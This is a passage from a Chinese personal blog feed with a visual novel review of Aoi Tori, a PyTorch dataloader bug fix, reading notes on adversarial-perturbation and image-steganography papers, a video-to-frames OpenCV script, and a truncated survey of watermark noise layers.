        <content type="html"><![CDATA[<h1 id="Gal艺术鉴赏"><a href="#Gal艺术鉴赏" class="headerlink" title="Gal艺术鉴赏"></a>Gal艺术鉴赏</h1><p>Galgame是艺术，是世界的珍宝。Purple software的用词据说很讲究，可惜只有青鸟是汉化的，用机翻看的话根本感觉不出来，虽然我浸淫ACGN多年，看日语也不是完全看不懂。</p><h1 id="アオイトリ（青鸟）"><a href="#アオイトリ（青鸟）" class="headerlink" title="アオイトリ（青鸟）"></a>アオイトリ（青鸟）</h1><p>本文所有图很多都是偷的网上的，不想从硬盘里面拖出来截图。</p><p>是这个。</p><blockquote><p>《青鸟》是比利时戏剧家<a href="https://baike.baidu.com/item/%E8%8E%AB%E9%87%8C%E6%96%AF%C2%B7%E6%A2%85%E7%89%B9%E6%9E%97%E5%85%8B">莫里斯·梅特林克</a>创作的戏剧。</p><p>《青鸟》是一部六幕梦幻剧，该剧描写了樵夫的孩子蒂蒂尔和米蒂尔在圣诞节前夜受仙女之托为邻家生病的女孩寻找青鸟的经历。他们到了了思念之国、夜之宫、森林和墓地，又来到了幸福国和未来王国。他们找到的青鸟不是改变了颜色就是死掉。最后，他们发现，自己家的斑鸠就是青鸟，它治好了女孩的病，并且飞走了。兄妹俩也在这一次历险中领会到了幸福的真谛：<strong>原来青鸟就在自己家里，而幸福，就在身边。只有甘愿把幸福给别人，自己才会感到幸福。</strong></p><p>该剧通过两个小孩寻找青鸟的故事反映了作者对穷人生活的同情、对现实和未来的憧憬。在剧中各种各种动植物、各种思想情感、各种社会现象、甚至抽象的概念和未来的事物都拟人化了，具体而形象地给读者以启迪。</p></blockquote><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823163721050.png" alt="image-20220823163721050"></p><p>不对，放错图了。这张明理画的妙，我可以感受到美。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823163741957.png" alt="image-20220823163741957"></p><p>和上面那个小童话可能稍微有些关系。主要是 <strong>青鸟</strong> 这个名字有关。</p><p>霓虹国似乎是很喜欢青鸟这个意向，比如</p><ul><li><p>《利兹与青鸟》自己写了一个童话，利兹放了青鸟自由。可是谁是青鸟，谁又是利兹呢？答案是两人互为青鸟，互为利兹。可以找到利兹与青鸟的交响乐组曲，很有意思，单簧管和笛子的合奏？意象是”自由“，”知己“。自由占7成，知己占3成。</p></li><li><p>《火影》中的雷切怪。<del>我不讲男人。</del></p></li><li><p>此处的青鸟。就是上述《青鸟》童话里面的”幸福“意象。</p></li></ul><p>序章和真结局非常惊艳，其他部分不过凡品。</p><p>这主要原因在于有吸血鬼、恶魔、疑似耶稣，在场的超自然背景里面，你让这些家伙演话剧非常的愚蠢，还是演了4遍不一样的话剧。</p><p>矛盾冲突不强。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823163811297.png" alt="image-20220823163811297"></p><h2 id="序章–玛丽：太阳和死亡二选一"><a href="#序章–玛丽：太阳和死亡二选一" class="headerlink" title="序章–玛丽：太阳和死亡二选一"></a>序章–玛丽：太阳和死亡二选一</h2><p>遇见了百岁的吸血鬼玛丽。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823163846801.png" alt="image-20220823163846801"></p><p>救玛丽</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823163908266.png" alt="image-20220823163908266"></p><p>玛丽可以活在阳光下</p><p>这页cg质量很高，无论是氛围还是音乐，到达了整个序章的高潮。那束阳光，让人感受到了百年黑暗的破碎。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823163923661.png" alt="image-20220823163923661"></p><h2 id="真结局–海野明理：生而”平凡“，追求“特别”"><a href="#真结局–海野明理：生而”平凡“，追求“特别”" class="headerlink" title="真结局–海野明理：生而”平凡“，追求“特别”"></a>真结局–海野明理：生而”平凡“，追求“特别”</h2><p>——我宽恕你。</p><p>真结局的宗教味道很重。</p><p>在OP和3条线的最后全部在强调，明理是坏女人。反复的强调明理是黑鸟，蓝鸟是选的支线女主角。</p><p><strong>这不是巧了吗，我就是喜欢坏女人。</strong></p><p>问题来了，明理究竟追求特别还是追求堕落。还是只是厌恶特别。</p><p>我愿称之为反天龙人斗士。</p><p>值得注意，在进入明理线之后，明理逐渐变成长发了（原因在于主角在某条支线里面说过喜欢长发，看谁还说拔吊无情）。虽然我还是更加喜欢短发。</p><p><img src="https://pic2.zhimg.com/80/v2-179f9737508309d02bce8c3601eadc81_720w.jpg" alt="img"></p><p>看这坏坏的小眼神。OP里面这张图的信息量还是很大的。海野明理对青鸟的厌恶，而且刚好是三只青鸟。被囚禁的黑鸟和飞在空中的青鸟。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823145813184.png" alt="image-20220823145813184"></p><h3 id="麦克白"><a href="#麦克白" class="headerlink" title="麦克白"></a>麦克白</h3><blockquote><ul><li><p>预言1：麦克白会被授予考特爵士的头衔；</p></li><li><p>预言2：麦克白会成为未来的君王；</p></li><li><p>预言3：班柯的子孙也会成为君王，而且比麦克白更有地位，更富有。</p></li><li><p>麦克白打了胜仗回国后，国王果然将考特爵士的头衔给了麦克白。证实预言1；</p></li><li><p>麦克白受预言的煽动、妻子的怂恿、自身野心的驱使，杀了现任的国王，篡夺了王位。证实预言2；</p></li><li><p>麦克白成为国王后受到内心极度恐惧和疑虑的折磨，为保住王位他实行暴政，滥杀无辜，成为疯狂残忍的暴君，最后被邓肯之子马尔康率领的讨伐之军消灭。证实预言3</p></li></ul></blockquote><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823160423550.png" alt="image-20220823160423550"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144504731.png" alt="image-20220823144504731"></p><h3 id="名场景：海野明理拔吊无情"><a href="#名场景：海野明理拔吊无情" class="headerlink" title="名场景：海野明理拔吊无情"></a>名场景：海野明理拔吊无情</h3><p>这里说的应该是希腊神话里面俄狄浦斯弑父娶母的神话，俄狄浦斯这位老哥也是挺惨的。这个神话的知名度算是希腊神话里面比较高的了。</p><p>这个神话是</p><ul><li>希腊传统礼法观念的重要体现，主要在于称呼亲戚的说法出现了递归，致使俄狄浦斯在晚年不得不移居出城，否则礼法将出现很大的漏洞。</li><li>预言体系的思想，神明至上。预言不可变，不为人力改变。说你俄狄浦斯弑父娶母，就是你爹有通天的本事也救不了。古希腊的宗教观可见一斑。</li></ul><p>不得不说，Purple社，讲台词是相当得讲究。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144540326.png" alt="image-20220823144540326"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144628526.png" alt="image-20220823144628526"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144652175.png" alt="image-20220823144652175"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144714687.png" alt="image-20220823144714687"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144737679.png" alt="image-20220823144737679"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144922949.png" alt="image-20220823144922949"></p><p>否定三连，不可能，没用的，没有意义。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823144910121.png" alt="image-20220823144910121"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823164718210.png" alt="image-20220823164718210"></p><h3 id="——我宽恕你"><a href="#——我宽恕你" class="headerlink" title="——我宽恕你"></a>——我宽恕你</h3><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823145034439.png" alt="image-20220823145034439"></p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823145112969.png" alt="image-20220823145112969"></p><h3 id="莎翁的威尼斯商人。"><a href="#莎翁的威尼斯商人。" class="headerlink" title="莎翁的威尼斯商人。"></a>莎翁的威尼斯商人。</h3><p><img src="https://pic3.zhimg.com/80/v2-98578cf017c1bc1ba50b65fad9d0053e_720w.jpg" alt="img"></p><h3 id="最美CG"><a href="#最美CG" class="headerlink" title="最美CG"></a>最美CG</h3><p>我在降生到这个世界时得到的礼物，一定是那“脆弱的人心”吧。</p><p><img src="/2022/08/23/gal-appreciate-purple/image-20220823145319302.png" alt="image-20220823145319302"></p>]]></content>
      
      
      <categories>
          
          <category> 艺术鉴赏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gal </tag>
            
            <tag> Purple soft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dataloader problem</title>
      <link href="/2022/08/10/dataloader%20problem/"/>
      <url>/2022/08/10/dataloader%20problem/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testdataset = Mydataset(device=<span class="string">&quot;des2&quot;</span>, train_val_test_mode=<span class="string">&#x27;tets&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if self.train_val_test_mode == &#x27;train&#x27; or self.train_val_test_mode ==&#x27;val&#x27;:</span><br><span class="line">    self.train_list, self.val_list = \</span><br><span class="line">        train_test_split(self.image_list, test_size=val_percent,</span><br><span class="line">                         train_size=1 - val_percent, random_state=1000)</span><br><span class="line">else:</span><br><span class="line">    self.test_list = self.image_list</span><br></pre></td></tr></table></figure><p>在dataloader 中加入新的分类，test_list类。</p><p>发现，出错，报错显示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> cannot be interpreted <span class="keyword">as</span> an integer</span><br></pre></td></tr></table></figure><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 这里重要，不是原本的总list,而是分割后的list</span></span><br><span class="line">    <span class="keyword">if</span> self.train_val_test_mode == <span class="string">&quot;train&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.train_list)</span><br><span class="line">    <span class="keyword">elif</span> self.train_val_test_mode == <span class="string">&quot;val&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.val_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#     bug 此处的len  self.test一定要写</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.test_list)</span><br></pre></td></tr></table></figure><p>在dataloader的 __ len __函数里面加入mode &#x3D; test情况的数据集len，</p><p>否则此时无法读取数据集的长度。</p>]]></content>
      
      
      <categories>
          
          <category> 问题解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deeplearning </tag>
            
            <tag> cv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>watermark papers</title>
      <link href="/2022/08/10/watermark-papers/"/>
      <url>/2022/08/10/watermark-papers/</url>
      
        <content type="html"><![CDATA[<h1 id="CD-UAP-Class-Discriminative-Universal-Adversarial-Perturbation（AAAI-2020）"><a href="#CD-UAP-Class-Discriminative-Universal-Adversarial-Perturbation（AAAI-2020）" class="headerlink" title="CD-UAP: Class Discriminative Universal Adversarial Perturbation（AAAI,2020）"></a><strong>CD-UAP: Class Discriminative Universal Adversarial Perturbation</strong>（AAAI,2020）</h1><blockquote><p>Consequently, it can be of practical relevance for an attacker to have control over the classes to attack. A natural question arises whether it is possible to craft a universal perturbation that fools the network only for certain classes while having minimal inflfluence on other classes</p></blockquote><p>没怎么看懂</p><p>攻击方的角度控制分类&#x2F;分割网络的分类结果。要求控制具有灵活性，能够控制特定的类别，而不影响其他类别</p><p>UAP:A single universal adversarial perturbation (UAP)</p><p>CD-UAP:class discriminative universal adversarial perturbation(CD-UAP)</p><p><strong>THE Target of CD-UAP</strong>: maximizing  the attack success rate og the targted classes ,while minimizing the influence of perturbation on non-targeted classes.</p><p>Attack categorize: targeted and non-targeted ,white box an black box ,image dependent and image agnostic attack.</p><p><img src="/watermark-papers/image-20220810160026599.png" alt="image-20220810160026599"></p><h2 id="图像相关攻击-图像无关攻击"><a href="#图像相关攻击-图像无关攻击" class="headerlink" title="图像相关攻击-图像无关攻击"></a>图像相关攻击-图像无关攻击</h2><p>提前计算是什么意思？</p><p>图像相关攻击：针对某个特定图像的攻击。不能提前计算？，可以自由选择类别</p><p>图像无关攻击：又被称为UAP，对所有的图像进行攻击。可以提前计算？，但是不呢自由选择类别</p><h2 id="CD-UAP"><a href="#CD-UAP" class="headerlink" title="CD-UAP"></a>CD-UAP</h2><ul><li>AC-UAP通用公式</li></ul><p><img src="/watermark-papers/image-20220810150116182.png" alt="image-20220810150116182"></p><p>对于多数图片，加入一个小的扰动之后，分类结果会改变，这是网络的一个有趣的特点。扰动小于某个阈值，是为了人眼的不可视。</p><ul><li><p>CD-UAP通用公式：</p><p>t表示选中的类别，nt表示没有选中的类别</p></li></ul><p><img src="/watermark-papers/image-20220810150550603.png" alt="image-20220810150550603"></p><ul><li>算法伪代码</li></ul><p><img src="/watermark-papers/image-20220810151605239.png" alt="image-20220810151605239"></p><p>主要对目标类别和非目标类别采用两种loss约束。而不是仅在目标类别加入扰动，这东西挺复杂的，但是即使是仅在目标类别加入扰动也会导致非目标类别的变化</p><p><img src="/watermark-papers/image-20220810153332535.png" alt="image-20220810153332535"></p><p><strong>有两个目标</strong>：targeted 图像应当引导loss欺骗网络，而non targeted图像应当引导loss，使得扰动对于non targeted  的图像的干扰不影响预测。使用target类和非target类的两个loss约束，非target类loss的权重越大，要求攻击越隐蔽；target类loss权重越大，攻击越大。</p><h1 id="A-Survey-on-Deep-Convolutional-Neural-Networks-for-Image-Steganography-and-Steganalysis"><a href="#A-Survey-on-Deep-Convolutional-Neural-Networks-for-Image-Steganography-and-Steganalysis" class="headerlink" title="A Survey on Deep Convolutional Neural Networks for Image Steganography and  Steganalysis"></a>A Survey on Deep Convolutional Neural Networks for Image Steganography and  Steganalysis</h1><p>挺复杂的综述</p><h1 id="Attention-Based-Data-Hiding-with-Generative-Adversarial-Networks"><a href="#Attention-Based-Data-Hiding-with-Generative-Adversarial-Networks" class="headerlink" title="Attention Based Data Hiding with Generative Adversarial Networks"></a><strong>Attention Based Data Hiding with Generative Adversarial Networks</strong></h1><p>期刊：AAAI 2020  </p><p>简述：应用注意力机制，使用GAN生成隐写图像</p><p>作者：<strong>Chong Yu</strong></p><p>机构：NVIDIA Corporation</p><p><img src="/watermark-papers/image-20220811111834521.png" alt="image-20220811111834521"></p><p>注意力机制生成隐写图像</p><p><img src="/watermark-papers/image-20220811111813414.png" alt="image-20220811111813414"></p><p><img src="/watermark-papers/image-20220811134642795.png" alt="image-20220811134642795"></p><p>Lic要求cover的提取和target(container)的提取相差很大，min（1&#x2F;x），要求分母越大 越好。很有道理，这可能对鲁棒性有帮助。</p><p>Lgan就是正常的GAN loss的判别器，要求达到纳什均衡，博弈无法判别真假生成图像的真假。</p><h1 id="Universal-adversarial-perturbations"><a href="#Universal-adversarial-perturbations" class="headerlink" title="Universal adversarial perturbations"></a>Universal adversarial perturbations</h1><p>期刊：cvpr 2017</p><p>简述：一种通用扰动方法UAP,对所有图像进行扰动，无法进行特定类的干扰。对普遍网络可行</p><p>作者：<strong>Seyed-Mohsen Moosavi-Dezfooli</strong></p><p>机构：瑞士洛桑理工学院</p><p>代码：The code is available for download on <a href="https://github.com/LTS4/universal">https://github.com/LTS4/universal</a>. A demo can be found on <a href="https://youtu.be/jhOu5yhe0rc">https://youtu.be/jhOu5yhe0rc</a>. </p><p>感觉没什么用，至少对watermark是没什么用处的，虽然和noise layer设计有一点关系，和noise layer的主要区别在于noise layer 没有最小扰动的约束，可以随意加入攻击。</p><p><img src="/watermark-papers/image-20220811141312181.png" alt="image-20220811141312181"></p><p>fool the State Of Art  deep neural network</p><p><img src="/watermark-papers/image-20220811143419523.png" alt="image-20220811143419523"></p><p>目的是寻找一个向量v,使得这个向量能够扰动全部的图像。并要求最小化v</p><p><img src="/watermark-papers/image-20220811204817280.png" alt="image-20220811204817280"></p><p>算法很简单，就是递增v，直到到达网络错误率和v最小化的要求</p><h1 id="Understanding-Adversarial-Examples-from-the-Mutual-Inflfluence-of-Images-and-Perturbations"><a href="#Understanding-Adversarial-Examples-from-the-Mutual-Inflfluence-of-Images-and-Perturbations" class="headerlink" title="Understanding Adversarial Examples from the Mutual Inflfluence of Images and Perturbations"></a>Understanding Adversarial Examples from the Mutual Inflfluence of Images and Perturbations</h1><p>期刊：cvpr 2020</p><p>简述：第一个没有使用原始图像数据集对图像进行通用攻击</p><p>作者：<strong>Chaoning Zhang</strong></p><p>机构：Robotics and Computer Vision (RCV) Laboratory 韩国科学技术高级研究所(KAIST)</p><p>感觉这个机构挺厉害的。</p><blockquote><ul><li>使用代理数据集Proxy dataset(不懂)获取随机源的图像，使不知晓源数据集的信息。</li><li>提出：UAP（Universal adversarial perturbations）是特征，而不是噪声。在图像中的表现形式是噪声。通用攻击扰动需要在不知晓数据集的情况下进行，原因在于攻击者确实在多数情况下无法获取训练数据集。</li><li>以往方法：UAP 是一种图像噪声。</li></ul></blockquote><p>普遍对抗扰动表现得像主要特征，而图像本身表现为噪声。</p><p>AE(Adversarial Examples)中攻击的实际效果是一种主导的特征，在图像中的表现为噪声。</p><p>依据相关系数进行实验，协方差&#x2F;两个标准差的积</p><p><img src="/watermark-papers/image-20220818184514401.png" alt="image-20220818184514401"></p><p><img src="/watermark-papers/image-20220818195857147.png" alt="image-20220818195857147"></p><p>加入不同噪声造成的相关性PCC。接近直线表示相关性越高。</p><p>没看懂。</p><h1 id="Adversarial-Examples-are-not-Bugs-they-are-Features"><a href="#Adversarial-Examples-are-not-Bugs-they-are-Features" class="headerlink" title="Adversarial Examples are not Bugs, they are Features"></a><strong>Adversarial Examples are not Bugs, they are Features</strong></h1><p>期刊：NIPS 2019</p><p>简述：</p><p>作者：<strong>Andrew Ilyas</strong></p><p>机构：不明</p><p>看不懂，公式很多，没多大用处,讲了一些稀奇古怪的东西。</p><p>对抗样本在机器学习中引起了广泛关注，但其存在和普遍存在的原因尚不清楚。对抗性样本可以直接归因于非鲁棒特征的存在:具有高度预测性的特征(来自数据分布中的模式)，但很脆弱，(因此)对人类来说是不可理解的。在理论框架内捕获这些特征后，确定它们在标准数据集中广泛存在。提出了一个简单的设置，可以严格地将在实践中观察到的现象与(人为指定的)鲁棒性概念和数据固有几何之间的不一致联系起来。</p><h1 id="With-Friends-Like-These-Who-Needs-Adversaries"><a href="#With-Friends-Like-These-Who-Needs-Adversaries" class="headerlink" title="With Friends Like These, Who Needs Adversaries?"></a><strong>With Friends Like These, Who Needs Adversaries?</strong></h1><p>对抗样本，这个领域很古怪。感觉没有干什么实事。</p><p>期刊：NIPS 2018</p><p>简述：</p><p>作者：<strong>Saumya Jetley</strong><em>∗</em>1  <strong>Nicholas A. Lord</strong><em>∗</em>1,2  <strong>Philip H.S. Torr</strong>1,2</p><p>机构：Department of Engineering Science, University of Oxford</p><p>code: replicating all experiments is provided at <a href="https://github.com/torrvision/whoneedsadversaries">https://github.com/torrvision/whoneedsadversaries</a></p><p>图像空间方向，和攻击的关系。图像空间方向是应用于分类的重点，在沿着同一图像空间方向的改变就成了扰动</p><p>通过一组相当直接的实验和解释，我们澄清了对抗性例子代表的是什么，以及现代dcn目前做什么和不做什么。在这样做的过程中，我们将专注于对手本身的工作与其他试图通过这些网络学习到的特征空间的工作结合在一起</p><p>通过抑制某些组件达到的分类网络的鲁棒性，会导致分类精度的下降</p><h1 id="SteganoGAN-Pushing-the-Limits-of-Image-Steganography"><a href="#SteganoGAN-Pushing-the-Limits-of-Image-Steganography" class="headerlink" title="SteganoGAN: Pushing the Limits of Image Steganography"></a><strong>SteganoGAN: Pushing the Limits of Image Steganography</strong></h1><p>期刊：arxiv 2019</p><p>简述：使用GAN网络进行水印嵌入，其他也没什么</p><p>机构：麻省理工学院</p><p>作者：<strong>Saumya Jetley</strong><em>∗</em>1  <strong>Nicholas A. Lord</strong><em>∗</em>1,2  <strong>Philip H.S. Torr</strong>1,2</p><p>代码：<a href="https://github.com/DAI-Lab/SteganoGAN">https://github.com/DAI-Lab/SteganoGAN</a></p><h2 id="现代隐写方法"><a href="#现代隐写方法" class="headerlink" title="现代隐写方法"></a>现代隐写方法</h2><ul><li>基于文件类型隐写</li><li>空域</li><li>频域</li><li>深度水印</li></ul><h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><p><img src="/watermark-papers/image-20220812203326479.png" alt="image-20220812203326479"></p><p>是常规的GAN网络</p><p>Critic损失,GAN网络的常见损失，就是真-假的概率，这个损失要求判别器中，生成图像逼近真实图像</p><p><img src="/watermark-papers/image-20220813105934757.png" alt="image-20220813105934757"></p><p><img src="/watermark-papers/image-20220813110824454.png" alt="image-20220813110824454"></p><h1 id="Generating-steganographic-images-via-adversarial-training"><a href="#Generating-steganographic-images-via-adversarial-training" class="headerlink" title="Generating steganographic images via adversarial training"></a><strong>Generating steganographic images via adversarial</strong> <strong>training</strong></h1><p>来源：NIPS 2017</p><p>作者：<strong>Jamie Hayes</strong></p><p>机构：University College London</p><p>邮件：<a href="mailto:&#106;&#x2e;&#x68;&#97;&#x79;&#x65;&#115;&#x40;&#x63;&#115;&#x2e;&#x75;&#x63;&#108;&#x2e;&#97;&#x63;&#x2e;&#117;&#107;">&#106;&#x2e;&#x68;&#97;&#x79;&#x65;&#115;&#x40;&#x63;&#115;&#x2e;&#x75;&#x63;&#108;&#x2e;&#97;&#x63;&#x2e;&#117;&#107;</a></p><p>简述：无监督的GAN网络水印模型.哪里来的无监督呀？</p><p>watermark任务自带GT的。这个loss函数用的那么大一个监督损失函数。</p><p><img src="/watermark-papers/image-20220815165030985.png" alt="image-20220815165030985"></p><h2 id="Eve网络loss"><a href="#Eve网络loss" class="headerlink" title="Eve网络loss"></a>Eve网络loss</h2><p><img src="/watermark-papers/image-20220815180803711.png" alt="image-20220815180803711"></p><h2 id="Bob网络loss"><a href="#Bob网络loss" class="headerlink" title="Bob网络loss"></a>Bob网络loss</h2><p>两个秘密信息的欧式距离</p><p><img src="/watermark-papers/image-20220815180843280.png" alt="image-20220815180843280"></p><h2 id="Alice网络loss"><a href="#Alice网络loss" class="headerlink" title="Alice网络loss"></a>Alice网络loss</h2><p>两个C的欧式距离</p><p><img src="/watermark-papers/image-20220815180901842.png" alt="image-20220815180901842"></p><h1 id="A-COVERLOSS-IMAGE-STEGANOGRAPHY"><a href="#A-COVERLOSS-IMAGE-STEGANOGRAPHY" class="headerlink" title="A COVERLOSS IMAGE STEGANOGRAPHY"></a>A COVERLOSS IMAGE STEGANOGRAPHY</h1><p>来源：<strong>International Research Journal of Engineering and Technology (IRJET)</strong> </p><p>作者：S.UMA MAHESWARI</p><p>机构：泰米尔纳德邦Panimalar工程学院电子与通信工程学院，印度</p><p>简述：没什么用 </p><p>4页纸的小论文</p><h1 id="STN-Spatial-Transformers-NET"><a href="#STN-Spatial-Transformers-NET" class="headerlink" title="STN(Spatial Transformers NET)"></a>STN(<strong>Spatial Transformers NET</strong>)</h1><p>简述：空间变换网络</p><p>作者：<strong>Max Jaderberg</strong></p><p>单位：Google DeepMind, London, UK</p><p><img src="/watermark-papers/image-20220819105715802.png" alt="image-20220819105715802"></p><p>通过卷积和池化和全连接层  生成仿射变换的矩阵。</p><p>这个生成仿射矩阵的网络过程可以放在目标网络之前而不需要loss函数约束。</p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cv </tag>
            
            <tag> 水印 </tag>
            
            <tag> 可拍摄 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>film to picture</title>
      <link href="/2022/08/08/film-to-picture/"/>
      <url>/2022/08/08/film-to-picture/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">video_path = <span class="string">r&#x27;D:\ApowerREC\20220808_153435.mp4&#x27;</span>  <span class="comment"># 视频地址</span></span><br><span class="line">output_path = <span class="string">r&#x27;D:/ApowerREC/False/&#x27;</span>  <span class="comment"># 输出文件夹</span></span><br><span class="line">interval = <span class="number">3</span>  <span class="comment"># 每间隔10帧取一张图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    vid = cv2.VideoCapture(video_path)</span><br><span class="line">    <span class="keyword">while</span> vid.isOpened():</span><br><span class="line">        is_read, frame = vid.read()</span><br><span class="line">        <span class="keyword">if</span> is_read:</span><br><span class="line">            <span class="keyword">if</span> num % interval == <span class="number">1</span>:</span><br><span class="line">                file_name = <span class="string">&#x27;%08d&#x27;</span> % num</span><br><span class="line">                cv2.imwrite(output_path + <span class="built_in">str</span>(file_name) + <span class="string">&#x27;.jpg&#x27;</span>, frame)</span><br><span class="line">                <span class="comment"># 00000111.jpg 代表第111帧</span></span><br><span class="line">                cv2.waitKey(<span class="number">1</span>)</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>拿来水数据集制作的脚本。interval实际上设置的太小了，应该要放到10左右，才不会有太多重合。</p><p>视频转图片，根据interval取图片，按照24帧&#x2F;S。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 本科生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>noise layer surver</title>
      <link href="/2022/08/05/noise-layer-surver/"/>
      <url>/2022/08/05/noise-layer-surver/</url>
      
        <content type="html"><![CDATA[<p>noise layer是鲁棒性水印的基础工作。几乎是不可能绕过去的。</p><p><strong>本文主要写noise layer，其他的基本不写了。反正这些家伙的网络结构都差不多</strong></p><p>这些家伙怎么写这破烂玩意都能投顶会呀。</p><h1 id="Noise-Layer本纪"><a href="#Noise-Layer本纪" class="headerlink" title="Noise Layer本纪"></a>Noise Layer本纪</h1><ul><li>有一点我觉得很奇怪，JPEG可微压缩的论文应该在2017年就有了，这些家伙竟然到2020才用到。</li><li>(不知道是在哪篇论文里面写的，但是讲的很全，到2020初的noise layer为止，2020年还有很重要的一篇cvpr没有讲)</li></ul><p>如何在网络中处理攻击失真才能使得水印算法在实用中更鲁棒，是近年来的研究热点。攻击主要分为两种，已知攻击和未知攻击。针对已知攻击目前主要有两种解决方法，一种是生成真实攻击失真数据[56]，缺点是需要大量的实拍数据，并进行矫正，需要很高的成本，并且难以有效模拟实际拍摄中的几何扭曲变换。另一种是模拟攻击数据。很多研究者进行研究，最大的困难是解决不可微压缩问题，如JPEG压缩等。2019年，文献[57]首次提出噪声层的设计并且通过JPEG-Drop对系数采用渐进式滤除。文献[58，59]中，通过设计一系列可微分的函数来模拟JPEG压缩的每一步。文献[60]中，采用了不同于前两种的思想，他们将编码器和解码器分离，是不可微的JPEG压缩损耗仅通过解码器传播，减轻不可微的问题。2020年，文献[61]将JPEG压缩视为一种特殊噪声，在反向传播时不经过JPEG压缩部分。此外，在攻击分配策略上，方法[57，59]在训练时，每批训练一种单一类型的失真，交替训练。方法[62]提出了一种新的分类策略，他们将每批数据再分组，每组包含一种攻击类型，每批包含所有攻击类型。这种新策略使得网络收敛的更快。在解决未知攻击问题上，文献[58]利用对抗的思想解决该问题。此外，文献[63]中提出了一个不变空间的新方法，他们在训练时不引入任何攻击，而是通过一个全连接层，将编码器生成的3通道信息映射到N通道上，解码器基于N通道信息（不变空间）解码。从实验结果显示，他们的算法对于某些攻击达到了较好的效果。</p><p>[56] Wengrowski E, Dana K. Light field messaging with deep photographic steganography[C]&#x2F;&#x2F;Proceedings of the IEEE&#x2F;CVF Conference on Computer Vision and Pattern Recognition. 2019: 1515-1524.<br>[57] Zhu, Jiren, et al. “Hidden: Hiding data with deep networks.” Proceedings of the European conference on computer vision (ECCV). 2018.<br>[58] Luo X, Zhan R, Chang H, et al. Distortion agnostic deep watermarking[C] &#x2F;&#x2F;Proceedings of the IEEE&#x2F;CVF Conference on Computer Vision and Pattern Recognition. 2020: 13548-13557.<br>[59] Ahmadi M, Norouzi A, Karimi N, et al. ReDMark: Framework for residual diffusion watermarking based on deep networks[J]. Expert Systems with Applications, 2020, 146: 113157.<br>[60] Liu Y, Guo M, Zhang J, et al. A novel two-stage separable deep learning framework for practical blind watermarking[C]&#x2F;&#x2F;Proceedings of the 27th ACM International Conference on Multimedia. 2019: 1509-1517.<br>[61] Zhang C, Karjauv A, Benz P, et al. Towards Robust Data Hiding Against (JPEG) Compression: A Pseudo-Differentiable Deep Learning Approach[J]. arXiv preprint arXiv:2101.00973, 2020.<br>[62] Zhang C, Benz P, Karjauv A, et al. Udh: Universal deep hiding for 